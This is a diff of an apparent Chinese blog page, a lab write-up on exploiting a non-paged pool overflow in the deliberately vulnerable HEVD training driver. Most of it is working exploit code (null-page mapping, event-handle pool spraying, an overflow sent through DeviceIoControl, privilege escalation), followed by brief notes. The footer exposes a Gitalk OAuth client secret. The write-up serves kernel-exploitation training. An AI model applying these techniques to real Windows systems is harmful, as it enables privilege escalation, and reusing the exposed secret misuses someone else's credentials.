+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0xee657645</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x00000000</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x00000040</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x00000000</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x00000000</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x00000001</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x00000001</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x00000000</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x00080000</span><span class="p">;</span>
+
+    <span class="c1">// begin exp</span>
+
+    <span class="n">LPVOID</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+    <span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+
+    <span class="n">HMODULE</span> <span class="n">hmodule</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">&quot;ntdll.dll&quot;</span><span class="p">);</span>
+
+    <span class="n">NtAllocateVirtualMemory_t</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtAllocateVirtualMemory_t</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hmodule</span><span class="p">,</span> <span class="s">&quot;NtAllocateVirtualMemory&quot;</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;getprocaddress failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">PVOID</span> <span class="n">baseAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">regionsize</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
+    <span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">baseAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regionsize</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;alloc failed,error code is:%u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x60</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;write failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">spray1</span><span class="p">[</span><span class="mi">10000</span><span class="p">];</span>
+    <span class="n">HANDLE</span> <span class="n">spray2</span><span class="p">[</span><span class="mi">5000</span><span class="p">];</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">spray1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateEventA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">spray2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateEventA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">spray2</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">));</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">CloseHandle</span><span class="p">(</span><span class="n">spray2</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">]);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+
+    <span class="n">HANDLE</span> <span class="n">hevDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&quot;</span><span class="p">,</span> <span class="mh">0xC0000000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">LPDWORD</span> <span class="n">lpBytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hevDevice</span><span class="p">,</span> <span class="mh">0x22200f</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">40</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">spray2</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">));</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">CloseHandle</span><span class="p">(</span><span class="n">spray2</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">]);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">spray1</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&quot;whoami&quot;</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>源码部分就不细说了，大家对照着 0x01 小节看就好了。这里说一下两个地方。</p>
+<p>第一个是 NtAllocateVirtualMemory。你可能会像我一样好奇第二个参数的值为什么是 1。我们看看官方文档怎么说的</p>
+<p><img alt="alt 8" src="../images/nonPagedpooloverflow/8.jpg" /></p>
+<p>首先我们不能让系统自己分配，因为我们要确切地从 0x00000000 开始分配。然后这个值根据我的测试结果只要你填一个大于 0 的数系统都会从 0x00000000 开始分配，其区别只在于影响到第四个参数(RegionSize)的返回值。文档上说是 rounded down，这应该是一个四舍五入的算法，具体从多少开始 rounded 到下一个我不太清楚，反正小一点分配本页面，大一点就是连下一个页面都分配了。因此这个值只要是个大于 0 的数就行。</p>
+<p>然后是堆栈平衡问题。</p>
+<p>这次我们的 shellcode 什么函数都没有劫持。只是 ObpDecrementHandleCount 函数简单地 call 了我们的 shellcode，然后我们的 shellcode 又什么寄存器都没修改，所以最后只要简单地 ret 就好了，不存在堆栈平衡问题，只是不知道为什么师傅们都 ret 16</p>
+<h2 id="0x03">0x03 结束语<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h2>
+<p>这次非换页池溢出感觉又学到了很多东西，写 exp 也熟练多了，虽然又是一天愉快的 error 99999 </p>
+<p>： )</p>
+<hr />
+<p><p align='right'>2019.9.3</p></p>
+                
+                  
+                
+              
+              
+                <blockquote class = "page-copyright">
+    <p>本页面的全部内容在 <strong>CC BY-NC-SA 3.0</strong> 协议之条款下提供</p>
+</blockquote>
+<!-- Comments Integration -->
+
+<h2 id="__comments">Comments</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: 'd918413ad93a14f36876',
+        clientSecret: '9c5740494e6c1c792df208d8abed35ef2bfd855d',
+        repo: 'comment',
+        owner: '50u1w4y',
+        admin: ['50u1w4y'],
+        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../arbitraryWrite/" title="（二）HEVD 任意地址覆盖" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                （二）HEVD 任意地址覆盖
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../misc/homePage/" title="Home Page" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Home Page
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2019 50u1w4y
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.245445c6.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
